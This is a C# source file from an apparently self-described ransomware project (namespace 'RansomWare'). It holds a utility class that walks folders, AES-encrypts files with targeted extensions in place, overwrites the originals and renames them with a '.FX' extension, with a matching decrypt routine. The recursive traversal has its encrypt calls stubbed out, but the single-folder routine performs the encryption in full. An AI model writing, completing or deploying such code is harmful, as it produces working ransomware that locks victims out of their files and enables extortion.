using System.IO;
using System.Security.Cryptography;
using Lib;

namespace RansomWare;

public class Util
{
    public static void TraverseDirectory(DirectoryInfo directory, Encryption encryption)
    {
        try
        {
            FileInfo[] files = directory.GetFiles();

            foreach (FileInfo file in files)
            {
                if (Enum.IsDefined(typeof(FileExtension), file.Extension))
                {
                    if (encryption == Encryption.ENCRYPT)
                    {
                        //ENCRYPT FILE
                        continue;
                    }

                    if (encryption == Encryption.DECRYPT)
                    {
                        //DECRYPT FILE
                    }
                }
            }

            DirectoryInfo[] subDirectories = directory.GetDirectories();
            foreach (DirectoryInfo subDirectory in subDirectories)
            {
                TraverseDirectory(subDirectory, encryption);
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Unauthorized access: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    public static void nonIterationFolder(DirectoryInfo directory, Encryption encryption)
    {
        try
        {
            FileInfo[] files = directory.GetFiles();

            foreach (FileInfo file in files)
            {
                if (encryption == Encryption.DECRYPT)
                {
                    DecryptFile(file, Settings.hashKey);
                    continue;
                }

                if (Enum.IsDefined(typeof(FileExtension), file.Extension.TrimStart('.').ToLower()))
                {
                    if (encryption == Encryption.ENCRYPT)
                    {
                        EncryptFile(file, Settings.hashKey);
                    }
                }
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Unauthorized access: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    public static void EncryptFile(FileInfo inputFile, byte[] key)
    {
        using (AesManaged aesAlg = new AesManaged())
        {
            aesAlg.Key = key;
            aesAlg.GenerateIV(); // Generate IV for each encryption

            using (ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV))
            {
                byte[] encryptedBytes;
                using (MemoryStream encryptedMemoryStream = new MemoryStream())
                {
                    using (FileStream inputFileStream = inputFile.OpenRead())
                    using (CryptoStream cryptoStream =
                           new CryptoStream(encryptedMemoryStream, encryptor, CryptoStreamMode.Write))
                    {
                        inputFileStream.CopyTo(cryptoStream);
                    }

                    encryptedBytes = encryptedMemoryStream.ToArray();
                }

                // Write IV and encrypted data to the original file
                using (FileStream outputFileStream = inputFile.OpenWrite())
                {
                    outputFileStream.SetLength(0); // Clear the file content
                    outputFileStream.Write(aesAlg.IV, 0, aesAlg.IV.Length);
                    outputFileStream.Write(encryptedBytes, 0, encryptedBytes.Length);
                }
            }
        }

        // Rename the file to include ".FX" extension
        string encryptedFileName = Path.ChangeExtension(inputFile.FullName, inputFile.Extension + ".FX");
        File.Move(inputFile.FullName, encryptedFileName);
    }

    public static void DecryptFile(FileInfo inputFile, byte[] key)
    {
        using (AesManaged aesAlg = new AesManaged())
        {
            aesAlg.Key = key;

            byte[] iv = new byte[aesAlg.BlockSize / 8];
            byte[] encryptedBytes;

            // Read IV from the beginning of the file
            using (FileStream inputFileStream = inputFile.OpenRead())
            {
                inputFileStream.Read(iv, 0, iv.Length);

                // Read the encrypted data from the input file
                encryptedBytes = new byte[inputFileStream.Length - (aesAlg.BlockSize / 8)];
                inputFileStream.Seek(aesAlg.BlockSize / 8, SeekOrigin.Begin); // Skip IV
                inputFileStream.Read(encryptedBytes, 0, encryptedBytes.Length);
            }

            aesAlg.IV = iv;

            using (ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV))
            {
                byte[] decryptedBytes;
                using (MemoryStream decryptedMemoryStream = new MemoryStream())
                {
                    using (CryptoStream cryptoStream =
                           new CryptoStream(decryptedMemoryStream, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(encryptedBytes, 0, encryptedBytes.Length);
                    }

                    decryptedBytes = decryptedMemoryStream.ToArray();
                }

                // Write the decrypted data back to the input file
                using (FileStream outputFileStream = inputFile.OpenWrite())
                {
                    outputFileStream.SetLength(0); // Clear the file content
                    outputFileStream.Write(decryptedBytes, 0, decryptedBytes.Length);
                }
            }
        }

        // Remove the ".FX" extension from the file name
        string originalFileName = Path.ChangeExtension(inputFile.FullName, null);

        // Rename the ".FX" file to the original file name
        inputFile.MoveTo(originalFileName);
    }
}